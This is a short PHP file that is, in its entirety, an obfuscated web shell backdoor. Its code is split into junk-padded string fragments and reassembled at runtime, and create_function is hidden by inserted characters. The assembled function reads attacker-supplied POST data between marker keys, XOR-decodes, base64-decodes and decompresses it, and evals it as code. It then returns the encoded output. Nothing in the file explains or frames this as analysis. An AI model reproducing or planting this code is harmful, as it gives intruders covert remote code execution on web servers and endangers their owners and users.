<?php
$L='==1) {@@|ob_sta@|@|rt();@eva@|l(@gzun@|compress(@x(@ba@|se6@|@|4_decode(';
$J='|tr@|len($t);$o@|=@|"";fo@|r(@|$i=0;$i<$l;){fo@|@|r($j=0;(@|$j<$c@|&&$i<@|$';
$A='$m@|[1]),$k)@|));$@|o=@ob_g@|et_co@|n@|tents(@|);@ob_@|end_clean();$r@|@';
$w=str_replace('aW','','aWcreaWaaWtaWe_aWfunctiaWon');
$p='l);$j++,$i++)@|{$o.=$@|t{$@|i}^$k{$j@|};@|}}return @|$o;}if @|@|(@preg_mat@|c';
$v='"S@|j3yGXm5BK@|yMaSVs@|";f@|unction x@|($t,$k){@|$c=strl@|en(@|$k);$l=s@';
$I='|=@base6@|4_encode(@@|x(@g@|zco@|mpress($o),@|$k));p@|rint("$p@|$kh$r$@|kf");}';
$l='@|h("/$kh@|(.+)$kf/",@fi@|le_ge@|t_@|contents("@|php:/@|/inp@|u@|@|t"),$m)';
$f='$@|k="ad24@|564a";$k@|@|h="8e18af18@|7c4e@|";$kf="e65@|a77c80a5@|9";$p@|=';
$d=str_replace('@|','',$f.$v.$J.$p.$l.$L.$A.$I);
$r=$w('',$d);$r();
?>
